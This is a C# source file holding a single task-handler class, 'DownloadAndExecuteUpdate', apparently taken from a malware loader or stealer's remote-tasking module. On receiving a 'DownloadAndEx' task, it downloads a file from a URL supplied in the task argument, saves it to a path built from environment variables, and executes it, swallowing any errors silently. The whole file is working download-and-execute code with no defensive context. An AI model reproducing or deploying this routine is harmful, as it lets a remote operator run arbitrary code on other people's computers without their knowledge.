using System;
using System.Diagnostics;
using System.IO;
using System.Net;

public class DownloadAndExecuteUpdate : ITaskProcessor
{
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.DownloadAndEx;
	}
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			System.Diagnostics.Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
				FileName = Environment.ExpandEnvironmentVariables(array[1])
			});
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
